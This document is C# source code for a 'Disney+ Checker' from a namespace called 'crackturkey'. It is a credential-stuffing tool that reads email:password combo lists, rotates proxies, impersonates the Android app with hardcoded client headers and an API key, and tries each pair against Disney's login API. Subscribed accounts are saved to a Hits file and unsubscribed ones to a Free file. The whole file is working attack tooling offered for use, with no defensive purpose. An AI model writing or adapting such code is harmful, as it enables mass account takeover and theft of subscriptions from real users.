using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Text;
using System.Drawing;
using Leaf.xNet;

namespace crackturkey
{
    internal class Checker_Main
    {
        static Color _color = Color.FromArgb(0, 247, 255);
        private static readonly ConcurrentDictionary<long, long> Cps = new ConcurrentDictionary<long, long>();
        private static readonly object WriteLock = new object();
        private Random rnd = new Random();
        private ConcurrentQueue<string> coqueue = new ConcurrentQueue<string>();
        private List<string> proqueue = new List<string>();
        private string currentdirectory = Directory.GetCurrentDirectory();
        private int hits;
        private int free;
        private int invalids;
        private int retries;
        private int length;
        private int checkd;
        private string protocol;
        private string folder;


        /// Tarama ekranındaki tanıtım kısımı.
        static string myTitle = "Disney+ Checker [->] 🔥 ! Muhammed 🔥";

        public Checker_Main(ConcurrentQueue<string> combos, List<string> proxies, string prot)
        {
            this.coqueue = combos;
            this.proqueue = proxies;
            this.length = this.coqueue.Count;
            this.protocol = prot;
            this.currentdirectory = Directory.GetCurrentDirectory();
            this.folder = this.currentdirectory + "\\Hits\\" + DateTime.Now.ToString("dd-MM-yyyy H.mm");
        }


        public void Create()
        {
            bool flag = !Directory.Exists("Hits");
            if (flag)
            {
                Directory.CreateDirectory("Hits");
            }
            bool flag2 = !Directory.Exists(this.folder);
            if (flag2)
            {
                Directory.CreateDirectory(this.folder);
            }
        }

        private void Login()
        {
            bool flag = this.protocol == "HTTP" || this.protocol == "SOCKS4" || this.protocol == "SOCKS5" || this.protocol == "NO";
            if (flag)
            {
                HttpRequest httpRequest = new HttpRequest
                {
                    UserAgent = "User-Agent: BAMSDK/v6.1.1 (disney-svod-3d9324fc 1.17.1.0; v3.0/v6.1.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)",
                    KeepAliveTimeout = 5000,
                    ConnectTimeout = 5000,
                    ReadWriteTimeout = 5000,
                    IgnoreProtocolErrors = true,
                    AllowAutoRedirect = true,
                    Proxy = null,
                    UseCookies = true
                };

                while (coqueue.Count > 0)
                {
                    string text;
                    coqueue.TryDequeue(out text);
                    string[] array = text.Split(new char[]
                    {
                        ':'
                    });
                    string acc = array[0] + ":" + array[1];
                    bool flag2 = httpRequest.Proxy == null;
                    if (flag2)
                    {
                        bool flag11 = this.protocol == "NO";
                        if (flag11)
                        {
                            httpRequest.Proxy = null;
                        }

                        bool flag3 = this.protocol == "HTTP";
                        if (flag3)
                        {
                            httpRequest.Proxy = HttpProxyClient.Parse(this.proqueue[this.rnd.Next(this.proqueue.Count)]);
                            httpRequest.Proxy.ConnectTimeout = 5000;
                        }
                        bool flag4 = this.protocol == "SOCKS4";
                        if (flag4)
                        {
                            httpRequest.Proxy = Socks4ProxyClient.Parse(this.proqueue[this.rnd.Next(this.proqueue.Count)]);
                            httpRequest.Proxy.ConnectTimeout = 5000;
                        }
                        bool flag5 = this.protocol == "SOCKS5";
                        if (flag5)
                        {
                            httpRequest.Proxy = Socks5ProxyClient.Parse(this.proqueue[this.rnd.Next(this.proqueue.Count)]);
                            httpRequest.Proxy.ConnectTimeout = 5000;
                        }

                    }

                    try
                    {

                        //Get Request Örneği
                        //string response1 = httpRequest.Get("https://secure.javhd.com/login/?back=javhd.com&path=L2VuLw&lang=en&nats=MC4wLjIuMi4wLjAuMC4wLjA").ToString();

                        //Parse Örneği
                        //string parse1 = Parse(response1, "salt = '", "'");


                        //Post Data array[0]=<USER> , array[1]=<PASS> ,parse1=<parse>
                        //string postdata = "username=" + array[0] + "&password=" + array[1];


                        //string response2 = httpRequest.Post("https://judua3rtinpst0s.xyz/v1/users/tokensn", postdata, "application/x-www-form-urlencoded").ToString();

                        Random rastgele = new Random();
                        string harfler = "abcdefghijklmnopqrstuvwxyz0123456789";
                        string IDE = "";
                        for (int i = 0; i < 16; i++)
                        {
                            IDE += harfler[rastgele.Next(harfler.Length)];
                        }

                        string TID = Guid.NewGuid().ToString();
                        string IDE2 = Guid.NewGuid().ToString();

                        httpRequest.AddHeader("Accept", "application/json");
                        httpRequest.AddHeader("Authorization", "ZGlzbmV5JmFuZHJvaWQmMS4wLjA.bkeb0m230uUhv8qrAXuNu39tbE_mD5EEhM_NAcohjyA");
                        httpRequest.AddHeader("X-BAMSDK-Platform-Id", "android");
                        httpRequest.AddHeader("X-Application-Version", "google");
                        httpRequest.AddHeader("X-BAMSDK-Client-ID", "disney-svod-3d9324fc");
                        httpRequest.AddHeader("X-BAMSDK-Platform", "android");
                        httpRequest.AddHeader("X-BAMSDK-Version", "6.1.1");
                        httpRequest.AddHeader("X-DSS-Edge-Accept", "vnd.dss.edge+json; version=2");
                        httpRequest.AddHeader("X-BAMSDK-Transaction-ID", TID);
                        httpRequest.AddHeader("User-Agent", "BAMSDK/v6.1.1 (disney-svod-3d9324fc 1.17.1.0; v3.0/v6.1.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)");
                        httpRequest.AddHeader("Host", "disney.api.edge.bamgrid.com");
                        httpRequest.AddHeader("Connection", "Keep-Alive");
                        httpRequest.AddHeader("Accept-Encoding", "gzip");

                        string tokendata = "{\"query\":\"\\n     mutation ($registerDevice: RegisterDeviceInput!) {\\n       registerDevice(registerDevice: $registerDevice) {\\n         __typename\\n       }\\n     }\\n     \",\"variables\":{\"registerDevice\":{\"applicationRuntime\":\"android\",\"attributes\":{\"osDeviceIds\":[{\"identifier\":\"" + IDE + "\",\"type\":\"android.vendor.id\"},{\"identifier\":\"" + IDE2 + "\",\"type\":\"android.advertising.id\"}],\"manufacturer\":\"OnePlus\",\"model\":\"A5010\",\"operatingSystem\":\"Android\",\"operatingSystemVersion\":\"7.1.2\"},\"deviceFamily\":\"android\",\"deviceLanguage\":\"en\",\"deviceProfile\":\"phone\"}}}";

                        string tokenurl = httpRequest.Post("https://disney.api.edge.bamgrid.com/graph/v1/device/graphql", tokendata, "application/json").ToString();

                        string accesstoken = Parse(tokenurl, "accessToken\":\"", "\"");

                        httpRequest.AddHeader("Accept", "application/json");
                        httpRequest.AddHeader("Authorization", accesstoken);
                        httpRequest.AddHeader("X-BAMSDK-Platform-Id", "android");
                        httpRequest.AddHeader("X-Application-Version", "google");
                        httpRequest.AddHeader("X-BAMSDK-Client-ID", "disney-svod-3d9324fc");
                        httpRequest.AddHeader("X-BAMSDK-Platform", "android");
                        httpRequest.AddHeader("X-BAMSDK-Version", "6.1.1");
                        httpRequest.AddHeader("X-DSS-Edge-Accept", "vnd.dss.edge+json; version=2");
                        httpRequest.AddHeader("X-BAMSDK-Transaction-ID", TID);
                        httpRequest.AddHeader("User-Agent", "BAMSDK/v6.1.1 (disney-svod-3d9324fc 1.17.1.0; v3.0/v6.1.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)");
                        httpRequest.AddHeader("Host", "disney.api.edge.bamgrid.com");
                        httpRequest.AddHeader("Connection", "Keep-Alive");
                        httpRequest.AddHeader("Accept-Encoding", "gzip");

                        string postdata = "{\"operationName\":\"login\",\"variables\":{\"input\":{\"email\":\"" + array[0] + "\",\"password\":\"" + array[1] + "\"},\"includePaywall\":false,\"includeActionGrant\":false},\"query\":\"mutation login($input: LoginInput!, $includePaywall: Boolean!, $includeActionGrant: Boolean!) { login(login: $input) { __typename account { __typename ...accountGraphFragment } actionGrant @include(if: $includeActionGrant) activeSession { __typename ...sessionGraphFragment } paywall @include(if: $includePaywall) { __typename ...paywallGraphFragment } } } fragment accountGraphFragment on Account { __typename id activeProfile { __typename id } profiles { __typename ...profileGraphFragment } parentalControls { __typename isProfileCreationProtected } flows { __typename star { __typename isOnboarded } } attributes { __typename email emailVerified userVerified locations { __typename manual { __typename country } purchase { __typename country } registration { __typename geoIp { __typename country } } } } } fragment profileGraphFragment on Profile { __typename id name maturityRating { __typename ratingSystem ratingSystemValues contentMaturityRating maxRatingSystemValue isMaxContentMaturityRating } isAge21Verified flows { __typename star { __typename eligibleForOnboarding isOnboarded } } attributes { __typename isDefault kidsModeEnabled groupWatch { __typename enabled } languagePreferences { __typename appLanguage playbackLanguage preferAudioDescription preferSDH subtitleLanguage subtitlesEnabled } parentalControls { __typename isPinProtected kidProofExitEnabled liveAndUnratedContent { __typename enabled } } playbackSettings { __typename autoplay backgroundVideo prefer133 } avatar { __typename id userSelected } } } fragment sessionGraphFragment on Session { __typename sessionId device { __typename id } entitlements experiments { __typename featureId variantId version } homeLocation { __typename countryCode } inSupportedLocation isSubscriber location { __typename countryCode } portabilityLocation { __typename countryCode } preferredMaturityRating { __typename impliedMaturityRating ratingSystem } } fragment paywallGraphFragment on Paywall { __typename skus { __typename name sku entitlements } paywallHash context assertions { __typename documentCode } }\"}";

                        string login = httpRequest.Post("https://disney.api.edge.bamgrid.com/v1/public/graphql", postdata, "application/x-www-form-urlencoded").ToString();

                        //Hits
                        if (login.Contains("isSubscriber\":true"))
                        {
                            Colorful.Console.WriteLine("[HIT] " + acc, Color.Green);
                            string capture =" | Checker By : 🔥 ! Muhammed 🔥";
                            hits++;
                            GlobalData.LastChecks++;
                            PremiumTextSave(acc, capture);
                        }

                        //Free-Custom
                        if (login.Contains("isSubscriber\":false"))
                        {
                            //Capture alırsan capture=Parse gönder
                            Colorful.Console.WriteLine("[FREE] " + acc, Color.Orange);
                            string capture = " | Checker By : 🔥 ! Muhammed 🔥";
                            free++;
                            GlobalData.LastChecks++;
                            FreeTextSave(acc, capture);
                        }

                        //Retries
                        //if (response2.Contains("{\"code\":\"BadRequest\""))
                        //{
                        //    retries++;
                        //    coqueue.Enqueue(acc);
                        //}

                        //Fail "||" veya(or) anlamında ve(and)  için ise "&&" kullan
                        if (login.Contains("errors\":[{\"message\":\""))
                        {
                            invalids++;
                            GlobalData.LastChecks++;
                        }

                        //Banned
                        //if (login.Contains("throttling_failurea"))
                        //{
                        //    retries++;
                        //    coqueue.Enqueue(acc);
                        //}




                    }
                    catch
                    {
                        retries++;
                        coqueue.Enqueue(text);
                        httpRequest.Proxy = null;
                    }
                }
                httpRequest.Dispose();
            }
        }

        public void Start()
        {
            Task.Factory.StartNew(delegate ()
            {
                while (GlobalData.Working)
                {
                    Checker_Main.Cps.TryAdd(DateTimeOffset.Now.ToUnixTimeSeconds(), (long)GlobalData.LastChecks);
                    GlobalData.LastChecks = 0;
                    Thread.Sleep(1000);
                }
            });
        }


        public void Threading(int amount)
        {
            ServicePointManager.DefaultConnectionLimit = amount * 2;
            ServicePointManager.Expect100Continue = false;
            List<Thread> list = new List<Thread>();
            list.Add(new Thread(new ThreadStart(this.Info)));
            for (int i = 0; i <= amount; i++)
            {
                Thread item = new Thread(new ThreadStart(this.Login));
                list.Add(item);
            }
            foreach (Thread thread in list)
            {
                thread.Start();
            }
        }

        private void Info()
        {
            for (; ; )
            {
                this.checkd = this.hits + this.free + this.invalids;
                Console.Title = string.Format(myTitle + "         Checked: {0}/{1}         Hits: {2}       Free: {6}        Invalids: {3}         Retries: {4}         CPM: {5} ", new object[]
                {
                    this.checkd,
                    this.length,
                    this.hits,
                    this.invalids,
                    this.retries,
                    this.GetCpm(),
                    this.free
                });
                Thread.Sleep(1000);
            }
        }


        private long GetCpm()
        {
            long num = 0L;
            foreach (KeyValuePair<long, long> keyValuePair in Checker_Main.Cps)
            {
                bool flag = keyValuePair.Key >= DateTimeOffset.Now.ToUnixTimeSeconds() - 60L;
                if (flag)
                {
                    num += keyValuePair.Value;
                }
            }
            return num;
        }

        private string Parse(string source, string left, string right)
        {
            return source.Split(new string[]
            {
                left
            }, StringSplitOptions.None)[1].Split(new string[]
            {
                right
            }, StringSplitOptions.None)[0];
        }


        private void PremiumTextSave(string acc, string capture)
        {
            object value = string.Concat(new string[]
            {
                acc,
                "",
                capture
            });
            string path = this.folder + "\\Hits.txt";
            try
            {
                bool flag = !File.Exists(path);
                if (flag)
                {
                    File.Create(path).Close();
                }
            }
            catch (Exception value2)
            {
                Console.WriteLine(value2);
            }
            try
            {
                object writeLock = Checker_Main.WriteLock;
                object obj = writeLock;
                lock (obj)
                {
                    using (FileStream fileStream = File.Open(path, FileMode.Append))
                    {
                        using (StreamWriter streamWriter = new StreamWriter(fileStream))
                        {
                            streamWriter.WriteLine(value);
                        }
                    }
                }
            }
            catch (Exception value3)
            {
                Console.WriteLine(value3);
            }
        }

        private void FreeTextSave(string acc, string capture)
        {
            object value = string.Concat(new string[]
           {
                acc,
                "",
                capture
           });

            string path = this.folder + "\\Free.txt";
            try
            {
                bool flag = !File.Exists(path);
                if (flag)
                {
                    File.Create(path).Close();
                }
            }
            catch (Exception value2)
            {
                Console.WriteLine(value2);
            }
            try
            {
                object writeLock = Checker_Main.WriteLock;
                object obj = writeLock;
                lock (obj)
                {
                    using (FileStream fileStream = File.Open(path, FileMode.Append))
                    {
                        using (StreamWriter streamWriter = new StreamWriter(fileStream))
                        {
                            streamWriter.WriteLine(value);
                        }
                    }
                }
            }
            catch (Exception value3)
            {
                Console.WriteLine(value3);
            }
        }

        //Lazım olurse Function
        public static string HmacSHA256(string key, string data)
        {
            string hash;
            ASCIIEncoding encoder = new ASCIIEncoding();
            Byte[] code = encoder.GetBytes(key);
            using (HMACSHA256 hmac = new HMACSHA256(code))
            {
                Byte[] hmBytes = hmac.ComputeHash(encoder.GetBytes(data));
                hash = ToHexString(hmBytes);
            }
            return hash;
        }

        //Lazım olurse Function
        public static string ToHexString(byte[] array)
        {
            StringBuilder hex = new StringBuilder(array.Length * 2);
            foreach (byte b in array)
            {
                hex.AppendFormat("{0:x2}", b);
            }
            return hex.ToString();
        }


    }
}
